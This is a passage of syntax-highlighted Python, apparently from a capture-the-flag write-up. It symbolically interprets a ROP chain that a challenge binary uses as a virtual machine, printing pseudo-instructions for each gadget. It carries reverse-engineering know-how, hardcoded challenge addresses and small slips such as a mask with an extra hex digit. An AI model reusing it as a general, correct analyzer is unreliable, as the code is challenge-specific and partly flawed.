</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">eflags</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">rax</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">rdi</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xfffffffffffffffff</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= rdi // rax -= {(rdi)}&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;eflags&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= rdi&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;eflags&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#a6e22e">rdi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffffffffffffffff</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">8</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;eflags&#39;</span>] <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ambig</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: if true -&gt; rax = {hex(rdx)} else -&gt; rax = {hex(rax)}&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: if true -&gt; rax = {hex(rdx)} else -&gt; rax = rax&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: if true -&gt; rax = rdx else -&gt; rax = rax&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">eflags</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax = {hex(rdx)}&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax = rdx&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax = {hex(rdx)}&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#a6e22e">pass</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span> <span style="color:#f92672">|</span> <span style="color:#a6e22e">ambig_ptr</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">9</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">ambig</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rdx |= rax&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rdx |= rax // rdx |= {rax}&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">|=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34785050</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rsp = rdx // rsp = main+0x50 // back to menu&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">rdx</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34785370</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rsp = rdx // rsp = main+0x370 // back to menu&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rsp = rdx // rsp = {hex(rdx)}&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rdx</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rsp = rdx&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">11</span>]<span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">mroe</span> <span style="color:#a6e22e">interpretation</span> <span style="color:#a6e22e">required</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: inc idx ; stack[idx] = rsp ; rsp = {hex(rax)}&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rax</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: inc idx ; stack[idx] = rsp ; rsp = rax&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">12</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rbp&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: mov rsp, {(rbp)} ; pop rbp&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">start</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x34785438</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#e6db74">&#39;-------- function_4() ---------&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: mov rsp, rbp ; pop rbp&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rbp&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">rsp</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rbp</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rbp&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rbp</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">13</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: r8d = eax; eax = r8d&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">r8</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">r8</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;r8&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">confi</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: r8d = eax; eax = r8d&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">r8</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">r8</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;r8&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">14</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= 1 // rax = {rax} - 1&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rax</span> <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rax</span> <span style="color:#f92672">&amp;=</span><span style="color:#ae81ff">0xffffffffffffffff</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= 1&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">15</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rdx</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">variables</span>.<span style="color:#a6e22e">keys</span>() <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">varname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rdx</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">variables</span>[<span style="color:#a6e22e">rdx</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;var_{varname}&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: (QWORD){variables[rdx]} = {rax}&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(QWORD *)(rdx) = {rax}&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdx&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(QWORD *)({variables[rdx]}) = rax&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>     
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(QWORD *)(rdx) = rax&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">must</span> <span style="color:#a6e22e">write</span> <span style="color:#a6e22e">memory</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">16</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">rsi</span> <span style="color:#a6e22e">not</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">variables</span>.<span style="color:#a6e22e">keys</span>() <span style="color:#a6e22e">and</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">varname</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">rsi</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;0x&#39;</span>,<span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">variables</span>[<span style="color:#a6e22e">rsi</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;var_{varname}&#39;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rsi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = {rdi}&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: (QWORD)({variables[(rsi)]}) = rdi&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(QWORD *)(rsi) = {rdi}&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span> 
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: *(QWORD *)(rsi) = rdi&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">must</span> <span style="color:#a6e22e">write</span> <span style="color:#a6e22e">memory</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">17</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rdi&#39;</span>] <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">confi</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">rdi</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x18</span>) <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">variables</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= (QWORD)({variables[rdi+0x18]})&#39;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= *(QWORD *)({rdi+0x18})&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rax -= *(QWORD *)(rdi+0x18)&#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">reg_state</span>[<span style="color:#e6db74">&#39;rax&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">ambig</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">rax</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span>        
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">elif</span> <span style="color:#a6e22e">addr</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">gads</span>[<span style="color:#ae81ff">18</span>]<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#a6e22e">not</span> <span style="color:#a6e22e">const_1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">f</span><span style="color:#e6db74">&#39;{hex(start+i*8)}: rbx = {chains[i+1]}&#39;</span>)
